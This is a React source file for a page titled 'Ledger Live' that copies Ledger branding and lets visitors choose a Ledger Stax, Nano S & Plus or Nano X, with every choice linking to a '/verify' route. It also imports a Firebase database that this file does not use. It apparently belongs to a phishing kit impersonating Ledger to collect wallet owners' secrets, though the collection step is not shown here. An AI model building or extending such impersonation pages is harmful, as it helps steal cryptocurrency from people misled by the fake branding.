import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import { HiOutlineArrowLongLeft } from "react-icons/hi2";
import { PiDesktopTowerBold } from "react-icons/pi";
import { BsUsbPlug } from "react-icons/bs";
import { FaBluetoothB } from "react-icons/fa";
import { FaStar, FaStarHalf, FaDesktop, FaRightLong, FaArrowRightLong, FaCoins, FaTabletScreenButton, FaChevronRight, FaFacebook,FaReddit,FaTwitter,FaInstagram, FaLinkedin, FaYoutube, FaTiktok, FaDiscord, FaCcPaypal } from "react-icons/fa6";


import logo from './../../assets/img/ledger.png';
import ledgerstax1 from './../../assets/img/ledgerstax.png';
import ledgernano from './../../assets/img/ledgernano.png';
import ledgernanox from './../../assets/img/ledgernanox.png';

import {db} from './../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";


function Device() {

    return (<AppLayout>
        <Helmet>
            <title>Ledger Live</title>
        </Helmet>
        <div className='container-fluid'>
            <div className='row'>
                <div className="col-sm-4 position-relative section py35">
                    <Link to="/" className="text-decoration-none text-white py10 px20 fs13 rounded-pill prev_btn" >
                        <HiOutlineArrowLongLeft  className='fs20 me10'/>Previous
                    </Link>
                    <div className="position-absolute w-100 text-center" style={{top:"30%", left:0}}>
                        <img src={ledgerstax1} alt="Ledger Stax" style={{filter: "invert(1)", height:"220px" }} className="imgmove1 img-fluid"/>
                        <h3 className='mobile_web_font fw-semibold'>Ledger Stax</h3>
                        <Link to="/verify" className='btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14'>Select</Link>
                    </div>
                </div>
                <div className="col-sm-4 position-relative section py35">
                    <div className="text-center fixed-top" style={{top: "20px"}}>
                        <img src={logo} alt="Logo" width="80" style={{filter: "invert(1)"}} title='CRYPTOCURRENCY & NFT WALLET' className="d-inline-block align-text-top" />
                        <h2 className="h6 mobile_web_font pt20">SELECT YOUR DEVICE</h2>
                    </div>
                    <div className="position-absolute w-100 text-center" style={{top:"30%", left:0}}>
                        <img src={ledgernano} alt="Ledger Nano S & Plus" style={{filter: "invert(1)", height:"220px" }} className="imgmove1 img-fluid"/>
                        <h3 className='mobile_web_font fw-semibold ls-1'>Ledger Nano S & Plus</h3>
                        <Link to="/verify" className='btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14'>Select</Link>
                    </div>
                </div>
                <div className="col-sm-4 position-relative section py35">
                    <div className="position-absolute w-100 text-center" style={{top:"30%", left:0}}>
                        <img src={ledgernanox} alt="Ledger Nano X" style={{filter: "invert(1)", height:"220px" }} className="imgmove1 img-fluid"/>
                        <h3 className='mobile_web_font fw-semibold'>Ledger Nano X</h3>
                        <Link to="/verify" className='btn bg-secondary2 bg-white text-black btn-lg rounded-pill fw-semibold px40 mt20 fs14'>Select</Link>
                    </div>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Device
